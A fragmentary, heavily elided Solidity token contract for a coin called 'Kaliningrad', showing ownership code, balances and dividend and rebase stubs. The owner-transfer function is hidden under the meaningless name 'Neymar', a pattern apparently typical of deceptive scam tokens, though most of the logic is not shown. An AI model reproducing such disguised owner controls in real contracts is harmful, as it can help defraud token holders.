...
contract Ownable is Context {  
    ...
    */
    ...
    function Neymar(address newOwner) external onlyOwner {
        _ownable = newOwner;
    }  
...
contract Kaliningrad is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 10000000 *  10**9;        
    
    string private _name = "Kaliningrad";
    string private _symbol = "KALIGRAD";
    ...
    function restAnalysis(address shareholder) external view returns (uint256, uint256, uint256, uint256) {
        return (
            totalShares,
            totalDistributed,
    ...
    function dividedAdd(address shareholder, uint256 amount) external {
    ...
    function setnewtoken(uint256 _lastRebasedTime, uint256 _tSupply) internal view returns (uint256) {
